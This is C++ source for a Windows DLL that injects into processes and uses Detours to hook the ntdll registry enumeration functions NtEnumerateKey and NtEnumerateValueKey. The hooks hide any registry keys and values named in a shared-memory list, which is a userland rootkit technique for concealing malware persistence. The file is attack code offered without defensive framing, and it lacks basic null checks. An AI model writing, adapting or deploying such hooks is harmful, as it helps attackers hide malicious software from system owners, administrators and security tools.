#include <stdio.h>
#include <Windows.h>
#include <Shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <vector>
#include <Winternl.h>
#include "resolve.h"

using namespace std;

#define UNICODE

NtEnumerateKey_t origNtEnumerateKey = NULL;
NtEnumerateValueKey_t origNtEnumerateValueKey = NULL;

std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
    std::vector<std::wstring> deserializedData;
    size_t pos = 0;
    std::wstring token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = serializedData.substr(0, pos);
        deserializedData.push_back(token);
        serializedData.erase(0, pos + 1);
    }
    if (!serializedData.empty()) {
        deserializedData.push_back(serializedData);
    }
    return deserializedData;
}

NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    vector<wstring> hideRegs = deserializeWStringVector(L"registryMapped");
    NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
    WCHAR* keyName = NULL;

    if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
    if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;

    for (const auto& hideReg : hideRegs) {
        if (wcsstr(keyName, hideReg.c_str())) {
            ZeroMemory(KeyInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};


NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    vector<wstring> hideRegs = deserializeWStringVector(L"registryMapped");    
    NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
    WCHAR* keyValueName = NULL;

    if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
    if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;

    for (const auto& hideReg : hideRegs) {
        if (wcsstr(keyValueName, hideReg.c_str())) {
            ZeroMemory(KeyValueInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        origNtEnumerateValueKey = (NtEnumerateValueKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtEnumerateValueKey");
        origNtEnumerateKey = (NtEnumerateKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtEnumerateKey");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
        DetourAttach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
        //DetourDetach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}
